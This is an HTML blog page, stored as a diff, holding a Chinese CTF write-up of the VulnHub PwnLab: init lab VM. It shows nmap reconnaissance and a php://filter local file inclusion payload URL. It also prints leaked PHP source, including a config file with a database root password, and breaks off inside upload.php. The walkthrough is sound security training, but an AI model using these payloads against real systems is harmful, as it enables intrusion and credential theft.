@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="关于 下载地址点我 Flag: /root/flag.txt 放假的第一天 哔哩哔哩视频  信息收集1234567891011121314151617181920212223242526272829303132333435nmap -sn 192.168.7.1/24 Starting Nmap 7.01 ( https://nmap.org ) at 2018-07-10 12:55 CSTNm">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Write-up]-pwnlab_init">
+<meta property="og:url" content="https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/index.html">
+<meta property="og:site_name" content="Kali-Team">
+<meta property="og:description" content="关于 下载地址点我 Flag: /root/flag.txt 放假的第一天 哔哩哔哩视频  信息收集1234567891011121314151617181920212223242526272829303132333435nmap -sn 192.168.7.1/24 Starting Nmap 7.01 ( https://nmap.org ) at 2018-07-10 12:55 CSTNm">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-02-14T00:40:14.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[Write-up]-pwnlab_init">
+<meta name="twitter:description" content="关于 下载地址点我 Flag: /root/flag.txt 放假的第一天 哔哩哔哩视频  信息收集1234567891011121314151617181920212223242526272829303132333435nmap -sn 192.168.7.1/24 Starting Nmap 7.01 ( https://nmap.org ) at 2018-07-10 12:55 CSTNm">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="https://www.gravatar.com/avatar/bc985422e4fd51abac5af2691ee33a93?s=16">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/bc985422e4fd51abac5af2691ee33a93?s=192" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/bc985422e4fd51abac5af2691ee33a93?s=180">
+          
+        
+    
+    <!-- title -->
+    <title>[Write-up]-pwnlab_init</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/$projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/07/16/Write-up-Trollcave-1-2/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/06/19/Write-up-Mr-Robot/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/&text=[Write-up]-pwnlab_init"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/&title=[Write-up]-pwnlab_init"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/&is_video=false&description=[Write-up]-pwnlab_init"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[Write-up]-pwnlab_init&body=Check out this article: https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/&title=[Write-up]-pwnlab_init"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/&title=[Write-up]-pwnlab_init"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/&title=[Write-up]-pwnlab_init"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/&title=[Write-up]-pwnlab_init"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/&name=[Write-up]-pwnlab_init&description=&lt;h3 id=&#34;关于&#34;&gt;&lt;a href=&#34;#关于&#34; class=&#34;headerlink&#34; title=&#34;关于&#34;&gt;&lt;/a&gt;关于&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;下载地址&lt;a href=&#34;https://download.vulnhub.com/pwnlab/pwnlab_init.ova&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;点我&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Flag: /root/flag.txt&lt;/li&gt;
+&lt;li&gt;放假的第一天&lt;/li&gt;
+&lt;li&gt;哔哩哔哩&lt;a href=&#34;https://www.bilibili.com/video/av26578404/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;视频&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;信息收集&#34;&gt;&lt;a href=&#34;#信息收集&#34; class=&#34;headerlink&#34; title=&#34;信息收集&#34;&gt;&lt;/a&gt;信息收集&lt;/h3&gt;&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nmap -sn 192.168.7.1/24 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Starting Nmap 7.01 ( https://nmap.org ) at 2018-07-10 12:55 CST&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Nmap scan report for 192.168.7.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host is up (0.00071s latency).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Nmap scan report for 192.168.7.130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host is up (0.00060s latency).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Nmap done: 256 IP addresses (2 hosts up) scanned in 2.39 seconds&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Starting Nmap 7.01 ( https://nmap.org ) at 2018-07-10 12:55 CST&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Nmap scan report for 192.168.7.130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host is up (0.00098s latency).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Not shown: 997 closed ports&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PORT     STATE SERVICE VERSION&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80/tcp   open  http    Apache httpd 2.4.10 ((Debian))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|_http-server-header: Apache/2.4.10 (Debian)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|_http-title: PwnLab Intranet Image Hosting&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111/tcp  open  rpcbind 2-4 (RPC #100000)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| rpcinfo: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   program version   port/proto  service&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   100000  2,3,4        111/tcp  rpcbind&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   100000  2,3,4        111/udp  rpcbind&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   100024  1          44040/tcp  status&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|_  100024  1          51756/udp  status&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3306/tcp open  mysql   MySQL 5.5.47-0+deb8u1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| mysql-info: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   Protocol: 53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   Version: .5.47-0+deb8u1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   Thread ID: 84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   Capabilities flags: 63487&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   Some Capabilities: SupportsTransactions, Support41Auth, DontAllowDatabaseTableColumn, ConnectWithDatabase, Speaks41ProtocolOld, SupportsLoadDataLocal, FoundRows, SupportsCompression, LongColumnFlag, Speaks41ProtocolNew, InteractiveClient, IgnoreSpaceBeforeParenthesis, LongPassword, IgnoreSigpipes, ODBCClient&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   Status: Autocommit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|_  Salt: &#34;]0w&#39;Xi((0XLS:j&#39;&#34;r&amp;lt;q&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#关于"><span class="toc-number">1.</span> <span class="toc-text">关于</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#信息收集"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过上传"><span class="toc-number">3.</span> <span class="toc-text">绕过上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提权"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        [Write-up]-pwnlab_init
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kali-Team</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-07-10T01:17:48.000Z" itemprop="datePublished">2018-07-10</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CTF/">CTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><ul>
+<li>下载地址<a href="https://download.vulnhub.com/pwnlab/pwnlab_init.ova" target="_blank" rel="noopener">点我</a></li>
+<li>Flag: /root/flag.txt</li>
+<li>放假的第一天</li>
+<li>哔哩哔哩<a href="https://www.bilibili.com/video/av26578404/" target="_blank" rel="noopener">视频</a></li>
+</ul>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.7.1/24 </span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-07-10 12:55 CST</span><br><span class="line">Nmap scan report for 192.168.7.1</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Nmap scan report for 192.168.7.130</span><br><span class="line">Host is up (0.00060s latency).</span><br><span class="line">Nmap done: 256 IP addresses (2 hosts up) scanned in 2.39 seconds</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-07-10 12:55 CST</span><br><span class="line">Nmap scan report for 192.168.7.130</span><br><span class="line">Host is up (0.00098s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: PwnLab Intranet Image Hosting</span><br><span class="line">111/tcp  open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp  rpcbind</span><br><span class="line">|   100024  1          44040/tcp  status</span><br><span class="line">|_  100024  1          51756/udp  status</span><br><span class="line">3306/tcp open  mysql   MySQL 5.5.47-0+deb8u1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 53</span><br><span class="line">|   Version: .5.47-0+deb8u1</span><br><span class="line">|   Thread ID: 84</span><br><span class="line">|   Capabilities flags: 63487</span><br><span class="line">|   Some Capabilities: SupportsTransactions, Support41Auth, DontAllowDatabaseTableColumn, ConnectWithDatabase, Speaks41ProtocolOld, SupportsLoadDataLocal, FoundRows, SupportsCompression, LongColumnFlag, Speaks41ProtocolNew, InteractiveClient, IgnoreSpaceBeforeParenthesis, LongPassword, IgnoreSigpipes, ODBCClient</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|_  Salt: "]0w'Xi((0XLS:j'"r&lt;q</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<ol>
+<li>开了80和3306端口，系统Debian，打开Web看看</li>
+<li>发现URL有一个规律，可能page后面跟着是一个文件名，但是没有后缀名</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php if(isset($_GET[&apos;page&apos;]))&#123;</span><br><span class="line">include($_GET[&apos;page&apos;].&quot;.php&quot;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>我们猜测index的代码像上面的功能一样。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.7.130/?page=login</span><br><span class="line">http://192.168.7.130/?page=upload</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>可能存在<code>LFI(local file inclusion)</code>漏洞</li>
+<li>构造URL<code>http://192.168.7.130/?page=php://filter/convert.base64-encode/resource=login</code></li>
+<li>发现可以包含读到文件，然后base64解密</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">---login.php---</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">require(&quot;config.php&quot;);</span><br><span class="line">$mysqli = new mysqli($server, $username, $password, $database);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;user&apos;]) and isset($_POST[&apos;pass&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">	$luser = $_POST[&apos;user&apos;];</span><br><span class="line">	$lpass = base64_encode($_POST[&apos;pass&apos;]);</span><br><span class="line"></span><br><span class="line">	$stmt = $mysqli-&gt;prepare(&quot;SELECT * FROM users WHERE user=? AND pass=?&quot;);</span><br><span class="line">	$stmt-&gt;bind_param(&apos;ss&apos;, $luser, $lpass);</span><br><span class="line"></span><br><span class="line">	$stmt-&gt;execute();</span><br><span class="line">	$stmt-&gt;store_Result();</span><br><span class="line"></span><br><span class="line">	if ($stmt-&gt;num_rows == 1)</span><br><span class="line">	&#123;</span><br><span class="line">		$_SESSION[&apos;user&apos;] = $luser;</span><br><span class="line">		header(&apos;Location: ?page=upload&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo &quot;Login failed.&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	?&gt;</span><br><span class="line">	&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">	&lt;label&gt;Username: &lt;/label&gt;&lt;input id=&quot;user&quot; type=&quot;test&quot; name=&quot;user&quot;&gt;&lt;br /&gt;</span><br><span class="line">	&lt;label&gt;Password: &lt;/label&gt;&lt;input id=&quot;pass&quot; type=&quot;password&quot; name=&quot;pass&quot;&gt;&lt;br /&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;?php</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li>跟着再把<code>require</code>中的config读出来</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$server	  = &quot;localhost&quot;;</span><br><span class="line">$username = &quot;root&quot;;</span><br><span class="line">$password = &quot;H4u%QJ_H99&quot;;</span><br><span class="line">$database = &quot;Users&quot;;</span><br><span class="line">?&gt;%</span><br></pre></td></tr></table></figure>
+<ol start="7">
+<li>顺便也把index和upload的也读了</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">---index---</span><br><span class="line">&lt;?php</span><br><span class="line">//Multilingual. Not implemented yet.</span><br><span class="line">//setcookie(&quot;lang&quot;,&quot;en.lang.php&quot;);</span><br><span class="line">if (isset($_COOKIE[&apos;lang&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">	include(&quot;lang/&quot;.$_COOKIE[&apos;lang&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">// Not implemented yet.</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;images/pwnlab.png&quot;&gt;&lt;br /&gt;</span><br><span class="line">[ &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt; ] [ &lt;a href=&quot;?page=login&quot;&gt;Login&lt;/a&gt; ] [ &lt;a href=&quot;?page=upload&quot;&gt;Upload&lt;/a&gt; ]</span><br><span class="line">&lt;hr/&gt;&lt;br/&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	if (isset($_GET[&apos;page&apos;]))</span><br><span class="line">	&#123;</span><br><span class="line">		include($_GET[&apos;page&apos;].&quot;.php&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo &quot;Use this server to upload and share image files inside the intranet&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;% </span><br><span class="line"></span><br><span class="line">---upload---</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&apos;user&apos;])) &#123; die(&apos;You must be log in.&apos;); &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;form action=&apos;&apos; method=&apos;post&apos; enctype=&apos;multipart/form-data&apos;&gt;</span><br><span class="line">			&lt;input type=&apos;file&apos; name=&apos;file&apos; id=&apos;file&apos; /&gt;</span><br><span class="line">			&lt;input type=&apos;submit&apos; name=&apos;submit&apos; value=&apos;Upload&apos;/&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">if(isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">	if ($_FILES[&apos;file&apos;][&apos;error&apos;] &lt;= 0) &#123;</span><br><span class="line">		$filename  = $_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">		$filetype  = $_FILES[&apos;file&apos;][&apos;type&apos;];</span><br><span class="line">		$uploaddir = &apos;upload/&apos;;</span><br><span class="line">		$file_ext  = strrchr($filename, &apos;.&apos;);</span><br><span class="line">		$imageinfo = getimagesize($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);</span><br><span class="line">		$whitelist = 